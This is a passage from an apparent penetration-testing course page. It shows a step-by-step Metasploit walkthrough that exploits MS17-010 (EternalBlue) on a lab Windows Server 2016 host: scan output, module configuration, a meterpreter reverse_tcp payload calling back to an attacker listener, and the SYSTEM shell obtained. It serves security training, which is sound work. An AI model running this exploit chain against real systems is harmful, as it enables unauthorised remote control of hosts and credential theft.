<a id=__codelineno-2-3 name=__codelineno-2-3 href=#__codelineno-2-3></a><span class=go>Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT</span>
<a id=__codelineno-2-4 name=__codelineno-2-4 href=#__codelineno-2-4></a><span class=go>NSE: Loaded 153 scripts for scanning.</span>
<a id=__codelineno-2-5 name=__codelineno-2-5 href=#__codelineno-2-5></a><span class=go>NSE: Script Pre-scanning.</span>
<a id=__codelineno-2-6 name=__codelineno-2-6 href=#__codelineno-2-6></a>
<a id=__codelineno-2-7 name=__codelineno-2-7 href=#__codelineno-2-7></a><span class=go>Discovered open port 135/tcp on 10.129.201.97</span>
<a id=__codelineno-2-8 name=__codelineno-2-8 href=#__codelineno-2-8></a><span class=go>Discovered open port 80/tcp on 10.129.201.97</span>
<a id=__codelineno-2-9 name=__codelineno-2-9 href=#__codelineno-2-9></a><span class=go>Discovered open port 445/tcp on 10.129.201.97</span>
<a id=__codelineno-2-10 name=__codelineno-2-10 href=#__codelineno-2-10></a><span class=go>Discovered open port 139/tcp on 10.129.201.97</span>
<a id=__codelineno-2-11 name=__codelineno-2-11 href=#__codelineno-2-11></a><span class=go>Completed Connect Scan at 18:13, 12.76s elapsed (1000 total ports)</span>
<a id=__codelineno-2-12 name=__codelineno-2-12 href=#__codelineno-2-12></a><span class=go>Completed Service scan at 18:13, 6.62s elapsed (4 services on 1 host)</span>
<a id=__codelineno-2-13 name=__codelineno-2-13 href=#__codelineno-2-13></a><span class=go>NSE: Script scanning 10.129.201.97.</span>
<a id=__codelineno-2-14 name=__codelineno-2-14 href=#__codelineno-2-14></a><span class=go>Nmap scan report for 10.129.201.97</span>
<a id=__codelineno-2-15 name=__codelineno-2-15 href=#__codelineno-2-15></a><span class=go>Host is up (0.13s latency).</span>
<a id=__codelineno-2-16 name=__codelineno-2-16 href=#__codelineno-2-16></a><span class=go>Not shown: 996 closed ports</span>
<a id=__codelineno-2-17 name=__codelineno-2-17 href=#__codelineno-2-17></a><span class=go>PORT    STATE SERVICE      VERSION</span>
<a id=__codelineno-2-18 name=__codelineno-2-18 href=#__codelineno-2-18></a><span class=go>80/tcp  open  http         Microsoft IIS httpd 10.0</span>
<a id=__codelineno-2-19 name=__codelineno-2-19 href=#__codelineno-2-19></a><span class=go>| http-methods: </span>
<a id=__codelineno-2-20 name=__codelineno-2-20 href=#__codelineno-2-20></a><span class=go>|   Supported Methods: OPTIONS TRACE GET HEAD POST</span>
<a id=__codelineno-2-21 name=__codelineno-2-21 href=#__codelineno-2-21></a><span class=go>|_  Potentially risky methods: TRACE</span>
<a id=__codelineno-2-22 name=__codelineno-2-22 href=#__codelineno-2-22></a><span class=go>|_http-server-header: Microsoft-IIS/10.0</span>
<a id=__codelineno-2-23 name=__codelineno-2-23 href=#__codelineno-2-23></a><span class=go>|_http-title: 10.129.201.97 - /</span>
<a id=__codelineno-2-24 name=__codelineno-2-24 href=#__codelineno-2-24></a><span class=go>135/tcp open  msrpc        Microsoft Windows RPC</span>
<a id=__codelineno-2-25 name=__codelineno-2-25 href=#__codelineno-2-25></a><span class=go>139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span>
<a id=__codelineno-2-26 name=__codelineno-2-26 href=#__codelineno-2-26></a><span class=go>445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds</span>
<a id=__codelineno-2-27 name=__codelineno-2-27 href=#__codelineno-2-27></a><span class=go>Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span>
<a id=__codelineno-2-28 name=__codelineno-2-28 href=#__codelineno-2-28></a>
<a id=__codelineno-2-29 name=__codelineno-2-29 href=#__codelineno-2-29></a><span class=go>Host script results:</span>
<a id=__codelineno-2-30 name=__codelineno-2-30 href=#__codelineno-2-30></a><span class=go>|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s</span>
<a id=__codelineno-2-31 name=__codelineno-2-31 href=#__codelineno-2-31></a><span class=go>| smb-os-discovery: </span>
<a id=__codelineno-2-32 name=__codelineno-2-32 href=#__codelineno-2-32></a><span class=go>|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span>
<a id=__codelineno-2-33 name=__codelineno-2-33 href=#__codelineno-2-33></a><span class=go>|   Computer name: SHELLS-WINBLUE</span>
<a id=__codelineno-2-34 name=__codelineno-2-34 href=#__codelineno-2-34></a><span class=go>|   NetBIOS computer name: SHELLS-WINBLUE\x00</span>
<a id=__codelineno-2-35 name=__codelineno-2-35 href=#__codelineno-2-35></a><span class=go>|   Workgroup: WORKGROUP\x00</span>
<a id=__codelineno-2-36 name=__codelineno-2-36 href=#__codelineno-2-36></a><span class=go>|_  System time: 2021-09-27T15:13:28-07:00</span>
<a id=__codelineno-2-37 name=__codelineno-2-37 href=#__codelineno-2-37></a><span class=go>| smb-security-mode: </span>
<a id=__codelineno-2-38 name=__codelineno-2-38 href=#__codelineno-2-38></a><span class=go>|   account_used: &lt;blank&gt;</span>
<a id=__codelineno-2-39 name=__codelineno-2-39 href=#__codelineno-2-39></a><span class=go>|   authentication_level: user</span>
<a id=__codelineno-2-40 name=__codelineno-2-40 href=#__codelineno-2-40></a><span class=go>|   challenge_response: supported</span>
<a id=__codelineno-2-41 name=__codelineno-2-41 href=#__codelineno-2-41></a><span class=go>|_  message_signing: disabled (dangerous, but default)</span>
<a id=__codelineno-2-42 name=__codelineno-2-42 href=#__codelineno-2-42></a><span class=go>| smb2-security-mode: </span>
<a id=__codelineno-2-43 name=__codelineno-2-43 href=#__codelineno-2-43></a><span class=go>|   2.02: </span>
<a id=__codelineno-2-44 name=__codelineno-2-44 href=#__codelineno-2-44></a><span class=go>|_    Message signing enabled but not required</span>
<a id=__codelineno-2-45 name=__codelineno-2-45 href=#__codelineno-2-45></a><span class=go>| smb2-time: </span>
<a id=__codelineno-2-46 name=__codelineno-2-46 href=#__codelineno-2-46></a><span class=go>|   date: 2021-09-27T22:13:30</span>
<a id=__codelineno-2-47 name=__codelineno-2-47 href=#__codelineno-2-47></a><span class=go>|_  start_date: 2021-09-23T15:29:29</span>
</code></pre></div> It is running Windows Server 2016 Standard 6.3. We have the hostname now, and we know it is not in a domain and is running several services.</p> <p><strong>IIS</strong> could be a potential path, attempting to access the host over SMB utilizing a tool like Impacket or authenticating if we had credentials could do it, and from an OS perspective, there may be a route for an RCE as well. MS17-010 (EternalBlue) has been known to affect hosts ranging from Windows 2008 to Server 2016. With this in mind, it could be a solid bet that our victim is vulnerable since it falls in that window. Let's validate that using a builtin auxiliary check from <strong>Metasploit, auxiliary/scanner/smb/smb_ms17_010</strong>.</p> <ol> <li>Search for and decide on an exploit path</li> </ol> <p>Determine an Exploit Path</p> <div class=highlight><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a><span class=go>msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use auxiliary/scanner/smb/smb_ms17_010 </span>
<a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a><span class=go>msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options</span>
<a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a>
<a id=__codelineno-3-4 name=__codelineno-3-4 href=#__codelineno-3-4></a><span class=go>Module options (auxiliary/scanner/smb/smb_ms17_010):</span>
<a id=__codelineno-3-5 name=__codelineno-3-5 href=#__codelineno-3-5></a>
<a id=__codelineno-3-6 name=__codelineno-3-6 href=#__codelineno-3-6></a><span class=go>   Name         Current Setting                 Required  Description</span>
<a id=__codelineno-3-7 name=__codelineno-3-7 href=#__codelineno-3-7></a><span class=go>   ----         ---------------                 --------  -----------</span>
<a id=__codelineno-3-8 name=__codelineno-3-8 href=#__codelineno-3-8></a><span class=go>   CHECK_ARCH   true                            no        Check for architecture on vulnerable hosts</span>
<a id=__codelineno-3-9 name=__codelineno-3-9 href=#__codelineno-3-9></a><span class=go>   CHECK_DOPU   true                            no        Check for DOUBLEPULSAR on vulnerable hosts</span>
<a id=__codelineno-3-10 name=__codelineno-3-10 href=#__codelineno-3-10></a><span class=go>   CHECK_PIPE   false                           no        Check for named pipe on vulnerable hosts</span>
<a id=__codelineno-3-11 name=__codelineno-3-11 href=#__codelineno-3-11></a><span class=go>   NAMED_PIPES  /usr/share/metasploit-framewor  yes       List of named pipes to check</span>
<a id=__codelineno-3-12 name=__codelineno-3-12 href=#__codelineno-3-12></a><span class=go>                k/data/wordlists/named_pipes.t</span>
<a id=__codelineno-3-13 name=__codelineno-3-13 href=#__codelineno-3-13></a><span class=go>                xt</span>
<a id=__codelineno-3-14 name=__codelineno-3-14 href=#__codelineno-3-14></a><span class=go>   RHOSTS                                       yes       The target host(s), range CIDR identifier, or hosts f</span>
<a id=__codelineno-3-15 name=__codelineno-3-15 href=#__codelineno-3-15></a><span class=go>                                                          ile with syntax &#39;file:&lt;path&gt;&#39;</span>
<a id=__codelineno-3-16 name=__codelineno-3-16 href=#__codelineno-3-16></a><span class=go>   RPORT        445                             yes       The SMB service port (TCP)</span>
<a id=__codelineno-3-17 name=__codelineno-3-17 href=#__codelineno-3-17></a><span class=go>   SMBDomain    .                               no        The Windows domain to use for authentication</span>
<a id=__codelineno-3-18 name=__codelineno-3-18 href=#__codelineno-3-18></a><span class=go>   SMBPass                                      no        The password for the specified username</span>
<a id=__codelineno-3-19 name=__codelineno-3-19 href=#__codelineno-3-19></a><span class=go>   SMBUser                                      no        The username to authenticate as</span>
<a id=__codelineno-3-20 name=__codelineno-3-20 href=#__codelineno-3-20></a><span class=go>   THREADS      1                               yes       The number of concurrent threads (max one per host)</span>
<a id=__codelineno-3-21 name=__codelineno-3-21 href=#__codelineno-3-21></a>
<a id=__codelineno-3-22 name=__codelineno-3-22 href=#__codelineno-3-22></a><span class=go>msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOSTS 10.129.201.97</span>
<a id=__codelineno-3-23 name=__codelineno-3-23 href=#__codelineno-3-23></a>
<a id=__codelineno-3-24 name=__codelineno-3-24 href=#__codelineno-3-24></a><span class=go>RHOSTS =&gt; 10.129.201.97</span>
<a id=__codelineno-3-25 name=__codelineno-3-25 href=#__codelineno-3-25></a><span class=go>msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span>
<a id=__codelineno-3-26 name=__codelineno-3-26 href=#__codelineno-3-26></a>
<a id=__codelineno-3-27 name=__codelineno-3-27 href=#__codelineno-3-27></a><span class=go>[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)</span>
<a id=__codelineno-3-28 name=__codelineno-3-28 href=#__codelineno-3-28></a><span class=go>[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)</span>
<a id=__codelineno-3-29 name=__codelineno-3-29 href=#__codelineno-3-29></a><span class=go>[*] Auxiliary module execution completed</span>
</code></pre></div> <p>Now, we can see from the check results that our target is likely vulnerable to EternalBlue. Let's set up the exploit and payload now, then give it a shot.</p> <ol> <li>Select Exploit &amp; Payload, then Deliver</li> </ol> <p>Choose &amp; Configure Our Exploit &amp; Payload</p> <div class=highlight><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a><span class=go>msf6 &gt; search eternal</span>
<a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a>
<a id=__codelineno-4-3 name=__codelineno-4-3 href=#__codelineno-4-3></a><span class=go>Matching Modules</span>
<a id=__codelineno-4-4 name=__codelineno-4-4 href=#__codelineno-4-4></a><span class=go>================</span>
<a id=__codelineno-4-5 name=__codelineno-4-5 href=#__codelineno-4-5></a>
<a id=__codelineno-4-6 name=__codelineno-4-6 href=#__codelineno-4-6></a><span class=gp>   #  </span>Name                                           Disclosure Date  Rank     Check  Description
<a id=__codelineno-4-7 name=__codelineno-4-7 href=#__codelineno-4-7></a><span class=go>   -  ----                                           ---------------  ----     -----  -----------</span>
<a id=__codelineno-4-8 name=__codelineno-4-8 href=#__codelineno-4-8></a><span class=go>   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span>
<a id=__codelineno-4-9 name=__codelineno-4-9 href=#__codelineno-4-9></a><span class=go>   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+</span>
<a id=__codelineno-4-10 name=__codelineno-4-10 href=#__codelineno-4-10></a><span class=go>   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span>
<a id=__codelineno-4-11 name=__codelineno-4-11 href=#__codelineno-4-11></a><span class=go>   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span>
<a id=__codelineno-4-12 name=__codelineno-4-12 href=#__codelineno-4-12></a><span class=go>   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection</span>
<a id=__codelineno-4-13 name=__codelineno-4-13 href=#__codelineno-4-13></a><span class=go>   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span>
</code></pre></div> <h2 id=configure-the-exploit-and-payload>Configure the exploit and payload<a class=headerlink href=#configure-the-exploit-and-payload title="Permanent link">&para;</a></h2> <div class=highlight><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a><span class=go>msf6 &gt; use 2</span>
<a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a><span class=go>[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span>
<a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a><span class=go>msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span>
<a id=__codelineno-5-4 name=__codelineno-5-4 href=#__codelineno-5-4></a>
<a id=__codelineno-5-5 name=__codelineno-5-5 href=#__codelineno-5-5></a><span class=go>Module options (exploit/windows/smb/ms17_010_psexec):</span>
<a id=__codelineno-5-6 name=__codelineno-5-6 href=#__codelineno-5-6></a>
<a id=__codelineno-5-7 name=__codelineno-5-7 href=#__codelineno-5-7></a><span class=go>   Name                  Current Setting              Required  Description</span>
<a id=__codelineno-5-8 name=__codelineno-5-8 href=#__codelineno-5-8></a><span class=go>   ----                  ---------------              --------  -----------</span>
<a id=__codelineno-5-9 name=__codelineno-5-9 href=#__codelineno-5-9></a><span class=go>   DBGTRACE              false                        yes       Show extra debug trace info</span>
<a id=__codelineno-5-10 name=__codelineno-5-10 href=#__codelineno-5-10></a><span class=go>   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction</span>
<a id=__codelineno-5-11 name=__codelineno-5-11 href=#__codelineno-5-11></a><span class=go>   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl</span>
<a id=__codelineno-5-12 name=__codelineno-5-12 href=#__codelineno-5-12></a><span class=go>                                                                ank for auto)</span>
<a id=__codelineno-5-13 name=__codelineno-5-13 href=#__codelineno-5-13></a><span class=go>   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check</span>
<a id=__codelineno-5-14 name=__codelineno-5-14 href=#__codelineno-5-14></a><span class=go>                         work/data/wordlists/named_p</span>
<a id=__codelineno-5-15 name=__codelineno-5-15 href=#__codelineno-5-15></a><span class=go>                         ipes.txt</span>
<a id=__codelineno-5-16 name=__codelineno-5-16 href=#__codelineno-5-16></a><span class=go>   RHOSTS                                             yes       The target host(s), range CIDR identifier, or h</span>
<a id=__codelineno-5-17 name=__codelineno-5-17 href=#__codelineno-5-17></a><span class=go>                                                                osts file with syntax &#39;file:&lt;path&gt;&#39;</span>
<a id=__codelineno-5-18 name=__codelineno-5-18 href=#__codelineno-5-18></a><span class=go>   RPORT                 445                          yes       The Target port (TCP)</span>
<a id=__codelineno-5-19 name=__codelineno-5-19 href=#__codelineno-5-19></a><span class=go>   SERVICE_DESCRIPTION                                no        Service description to to be used on target for</span>
<a id=__codelineno-5-20 name=__codelineno-5-20 href=#__codelineno-5-20></a><span class=go>                                                                 pretty listing</span>
<a id=__codelineno-5-21 name=__codelineno-5-21 href=#__codelineno-5-21></a><span class=go>   SERVICE_DISPLAY_NAME                               no        The service display name</span>
<a id=__codelineno-5-22 name=__codelineno-5-22 href=#__codelineno-5-22></a><span class=go>   SERVICE_NAME                                       no        The service name</span>
<a id=__codelineno-5-23 name=__codelineno-5-23 href=#__codelineno-5-23></a><span class=go>   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share</span>
<a id=__codelineno-5-24 name=__codelineno-5-24 href=#__codelineno-5-24></a><span class=go>                                                                (ADMIN$,C$,...) or a normal read/write folder s</span>
<a id=__codelineno-5-25 name=__codelineno-5-25 href=#__codelineno-5-25></a><span class=go>                                                                hare</span>
<a id=__codelineno-5-26 name=__codelineno-5-26 href=#__codelineno-5-26></a><span class=go>   SMBDomain             .                            no        The Windows domain to use for authentication</span>
<a id=__codelineno-5-27 name=__codelineno-5-27 href=#__codelineno-5-27></a><span class=go>   SMBPass                                            no        The password for the specified username</span>
<a id=__codelineno-5-28 name=__codelineno-5-28 href=#__codelineno-5-28></a><span class=go>   SMBUser                                            no        The username to authenticate as</span>
<a id=__codelineno-5-29 name=__codelineno-5-29 href=#__codelineno-5-29></a>
<a id=__codelineno-5-30 name=__codelineno-5-30 href=#__codelineno-5-30></a>
<a id=__codelineno-5-31 name=__codelineno-5-31 href=#__codelineno-5-31></a><span class=go>Payload options (windows/meterpreter/reverse_tcp):</span>
<a id=__codelineno-5-32 name=__codelineno-5-32 href=#__codelineno-5-32></a>
<a id=__codelineno-5-33 name=__codelineno-5-33 href=#__codelineno-5-33></a><span class=go>   Name      Current Setting  Required  Description</span>
<a id=__codelineno-5-34 name=__codelineno-5-34 href=#__codelineno-5-34></a><span class=go>   ----      ---------------  --------  -----------</span>
<a id=__codelineno-5-35 name=__codelineno-5-35 href=#__codelineno-5-35></a><span class=go>   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span>
<a id=__codelineno-5-36 name=__codelineno-5-36 href=#__codelineno-5-36></a><span class=go>   LHOST     192.168.86.48    yes       The listen address (an interface may be specified)</span>
<a id=__codelineno-5-37 name=__codelineno-5-37 href=#__codelineno-5-37></a><span class=go>   LPORT     4444             yes       The listen port</span>
</code></pre></div> <p>Be sure to set payload options correctly before running the exploit. In this instance, we need to ensure that our <strong>RHOSTS, LHOST, and LPORT</strong> fields are correctly set. For this attempt, accepting the defaults for the rest is OK.</p> <h2 id=validate>Validate<a class=headerlink href=#validate title="Permanent link">&para;</a></h2> <div class=highlight><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a><span class=go>msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options</span>
<a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a>
<a id=__codelineno-6-3 name=__codelineno-6-3 href=#__codelineno-6-3></a><span class=go>Module options (exploit/windows/smb/ms17_010_psexec):</span>
<a id=__codelineno-6-4 name=__codelineno-6-4 href=#__codelineno-6-4></a>
<a id=__codelineno-6-5 name=__codelineno-6-5 href=#__codelineno-6-5></a><span class=go>   Name                  Current Setting              Required  Description</span>
<a id=__codelineno-6-6 name=__codelineno-6-6 href=#__codelineno-6-6></a><span class=go>   ----                  ---------------              --------  -----------</span>
<a id=__codelineno-6-7 name=__codelineno-6-7 href=#__codelineno-6-7></a><span class=go>   DBGTRACE              false                        yes       Show extra debug trace info</span>
<a id=__codelineno-6-8 name=__codelineno-6-8 href=#__codelineno-6-8></a><span class=go>   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction</span>
<a id=__codelineno-6-9 name=__codelineno-6-9 href=#__codelineno-6-9></a><span class=go>   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl</span>
<a id=__codelineno-6-10 name=__codelineno-6-10 href=#__codelineno-6-10></a><span class=go>                                                                ank for auto)</span>
<a id=__codelineno-6-11 name=__codelineno-6-11 href=#__codelineno-6-11></a><span class=go>   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check</span>
<a id=__codelineno-6-12 name=__codelineno-6-12 href=#__codelineno-6-12></a><span class=go>                         work/data/wordlists/named_p</span>
<a id=__codelineno-6-13 name=__codelineno-6-13 href=#__codelineno-6-13></a><span class=go>                         ipes.txt</span>
<a id=__codelineno-6-14 name=__codelineno-6-14 href=#__codelineno-6-14></a><span class=go>   RHOSTS                10.129.201.97                yes       The target host(s), range CIDR identifier, or h</span>
<a id=__codelineno-6-15 name=__codelineno-6-15 href=#__codelineno-6-15></a><span class=go>                                                                osts file with syntax &#39;file:&lt;path&gt;&#39;</span>
<a id=__codelineno-6-16 name=__codelineno-6-16 href=#__codelineno-6-16></a><span class=go>   RPORT                 445                          yes       The Target port (TCP)</span>
<a id=__codelineno-6-17 name=__codelineno-6-17 href=#__codelineno-6-17></a><span class=go>   SERVICE_DESCRIPTION                                no        Service description to to be used on target for</span>
<a id=__codelineno-6-18 name=__codelineno-6-18 href=#__codelineno-6-18></a><span class=go>                                                                 pretty listing</span>
<a id=__codelineno-6-19 name=__codelineno-6-19 href=#__codelineno-6-19></a><span class=go>   SERVICE_DISPLAY_NAME                               no        The service display name</span>
<a id=__codelineno-6-20 name=__codelineno-6-20 href=#__codelineno-6-20></a><span class=go>   SERVICE_NAME                                       no        The service name</span>
<a id=__codelineno-6-21 name=__codelineno-6-21 href=#__codelineno-6-21></a><span class=go>   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share</span>
<a id=__codelineno-6-22 name=__codelineno-6-22 href=#__codelineno-6-22></a><span class=go>                                                                (ADMIN$,C$,...) or a normal read/write folder s</span>
<a id=__codelineno-6-23 name=__codelineno-6-23 href=#__codelineno-6-23></a><span class=go>                                                                hare</span>
<a id=__codelineno-6-24 name=__codelineno-6-24 href=#__codelineno-6-24></a><span class=go>   SMBDomain             .                            no        The Windows domain to use for authentication</span>
<a id=__codelineno-6-25 name=__codelineno-6-25 href=#__codelineno-6-25></a><span class=go>   SMBPass                                            no        The password for the specified username</span>
<a id=__codelineno-6-26 name=__codelineno-6-26 href=#__codelineno-6-26></a><span class=go>   SMBUser                                            no        The username to authenticate as</span>
<a id=__codelineno-6-27 name=__codelineno-6-27 href=#__codelineno-6-27></a>
<a id=__codelineno-6-28 name=__codelineno-6-28 href=#__codelineno-6-28></a>
<a id=__codelineno-6-29 name=__codelineno-6-29 href=#__codelineno-6-29></a><span class=go>Payload options (windows/meterpreter/reverse_tcp):</span>
<a id=__codelineno-6-30 name=__codelineno-6-30 href=#__codelineno-6-30></a>
<a id=__codelineno-6-31 name=__codelineno-6-31 href=#__codelineno-6-31></a><span class=go>   Name      Current Setting  Required  Description</span>
<a id=__codelineno-6-32 name=__codelineno-6-32 href=#__codelineno-6-32></a><span class=go>   ----      ---------------  --------  -----------</span>
<a id=__codelineno-6-33 name=__codelineno-6-33 href=#__codelineno-6-33></a><span class=go>   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span>
<a id=__codelineno-6-34 name=__codelineno-6-34 href=#__codelineno-6-34></a><span class=go>   LHOST     10.10.14.12      yes       The listen address (an interface may be specified)</span>
<a id=__codelineno-6-35 name=__codelineno-6-35 href=#__codelineno-6-35></a><span class=go>   LPORT     4444             yes       The listen port</span>
</code></pre></div> <p>This time, we kept it simple and just used a <strong>windows/meterpreter/reverse_tcp</strong> payload. You can change this as you wish for a different shell type or obfuscate your attack more.</p> <ol> <li>Excute Attack and Receive A Callback.</li> </ol> <h2 id=execute>Execute<a class=headerlink href=#execute title="Permanent link">&para;</a></h2> <div class=highlight><pre><span></span><code><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a><span class=go>msf6 exploit(windows/smb/ms17_010_psexec) &gt; exploit</span>
<a id=__codelineno-7-2 name=__codelineno-7-2 href=#__codelineno-7-2></a>
<a id=__codelineno-7-3 name=__codelineno-7-3 href=#__codelineno-7-3></a><span class=go>[*] Started reverse TCP handler on 10.10.14.12:4444 </span>
<a id=__codelineno-7-4 name=__codelineno-7-4 href=#__codelineno-7-4></a><span class=go>[*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393</span>
<a id=__codelineno-7-5 name=__codelineno-7-5 href=#__codelineno-7-5></a><span class=go>[*] 10.129.201.97:445 - Built a write-what-where primitive...</span>
<a id=__codelineno-7-6 name=__codelineno-7-6 href=#__codelineno-7-6></a><span class=go>[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!</span>
<a id=__codelineno-7-7 name=__codelineno-7-7 href=#__codelineno-7-7></a><span class=go>[*] 10.129.201.97:445 - Selecting PowerShell target</span>
<a id=__codelineno-7-8 name=__codelineno-7-8 href=#__codelineno-7-8></a><span class=go>[*] 10.129.201.97:445 - Executing the payload...</span>
<a id=__codelineno-7-9 name=__codelineno-7-9 href=#__codelineno-7-9></a><span class=go>[+] 10.129.201.97:445 - Service start timed out, OK if running a command or non-service executable...</span>
<a id=__codelineno-7-10 name=__codelineno-7-10 href=#__codelineno-7-10></a><span class=go>[*] Sending stage (175174 bytes) to 10.129.201.97</span>
<a id=__codelineno-7-11 name=__codelineno-7-11 href=#__codelineno-7-11></a><span class=go>[*] Meterpreter session 1 opened (10.10.14.12:4444 -&gt; 10.129.201.97:50215) at 2021-09-27 18:58:00 -0400</span>
<a id=__codelineno-7-12 name=__codelineno-7-12 href=#__codelineno-7-12></a>
<a id=__codelineno-7-13 name=__codelineno-7-13 href=#__codelineno-7-13></a><span class=go>meterpreter &gt; getuid</span>
<a id=__codelineno-7-14 name=__codelineno-7-14 href=#__codelineno-7-14></a>
<a id=__codelineno-7-15 name=__codelineno-7-15 href=#__codelineno-7-15></a><span class=go>Server username: NT AUTHORITY\SYSTEM</span>
<a id=__codelineno-7-16 name=__codelineno-7-16 href=#__codelineno-7-16></a><span class=go>meterpreter &gt; </span>
</code></pre></div> <p>We have landed our exploit and gained a shell session. A <strong>SYSTEM</strong> level shell at that. As seen in the earlier MSF modules, now that we have an open session through Meterpreter, we are presented with the <strong>meterpreter &gt;</strong> prompt. From here, we can utilize Meterpreter to run further commands to gather system information, steal user credentials, or use another post-exploitation module against the host. If you wish to interact with the host directly, you can also drop into an interactive shell session on the host from Meterpreter.</p> <ol> <li>Identify the Native Shell</li> </ol> <h2 id=identify-our-shell>Identify Our Shell<a class=headerlink href=#identify-our-shell title="Permanent link">&para;</a></h2> <div class=highlight><pre><span></span><code><a id=__codelineno-8-1 name=__codelineno-8-1 href=#__codelineno-8-1></a><span class=go>meterpreter &gt; shell</span>
<a id=__codelineno-8-2 name=__codelineno-8-2 href=#__codelineno-8-2></a>
<a id=__codelineno-8-3 name=__codelineno-8-3 href=#__codelineno-8-3></a><span class=go>Process 4844 created.</span>
<a id=__codelineno-8-4 name=__codelineno-8-4 href=#__codelineno-8-4></a><span class=go>Channel 1 created.</span>
<a id=__codelineno-8-5 name=__codelineno-8-5 href=#__codelineno-8-5></a><span class=go>Microsoft Windows [Version 10.0.14393]</span>
<a id=__codelineno-8-6 name=__codelineno-8-6 href=#__codelineno-8-6></a><span class="gp gp-VirtualEnv">(c)</span> <span class=go>2016 Microsoft Corporation. All rights reserved.</span>
<a id=__codelineno-8-7 name=__codelineno-8-7 href=#__codelineno-8-7></a>
<a id=__codelineno-8-8 name=__codelineno-8-8 href=#__codelineno-8-8></a><span class=go>C:\Windows\system32&gt;</span>
</code></pre></div> <p>Just seeing <strong>C:\Windows\system32&gt;</strong> can clue us in that we are just in a <strong>cmd.exe shell</strong>. To make sure, simply running the command help from within the shell will also let you know. If we were dropped into PowerShell, our prompt would look like <strong>PS C:\Windows\system32&gt;</strong>.</p> <h2 id=cmd-prompt-and-powershells-for-fun-and-profit>CMD-Prompt and Power[Shell]s for Fun and Profit<a class=headerlink href=#cmd-prompt-and-powershells-for-fun-and-profit title="Permanent link">&para;</a></h2> <p>Use <strong>CMD</strong> when:</p> <ul> <li>You are on an older host that may not include PowerShell.</li> <li>When you only require simple interactions/access to the host.</li> <li>When you plan to use simple batch files, net commands, or MS-DOS native tools.</li> <li>When you believe that execution policies may affect your ability to run scripts or other actions on the host.</li> </ul> <p>Use <strong>PowerShell</strong> when:</p> <ul> <li>You are planning to utilize cmdlets or other custom-built scripts.</li> <li>When you wish to interact with .NET objects instead of text output.</li> <li>When being stealthy is of lesser concern.</li> <li>If you are planning to interact with cloud-based services and hosts.</li> <li>If your scripts set and use Aliases.</li> </ul> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top data-md-state=hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg> Back to top </a> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../msfvenom/ class="md-footer__link md-footer__link--prev" aria-label="Previous: MSFvenom" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Previous </span> MSFvenom </div> </div> </a> <a href=../unix_linux/ class="md-footer__link md-footer__link--next" aria-label="Next: NIX Shells" rel=next> <div class=md-footer__title> <div 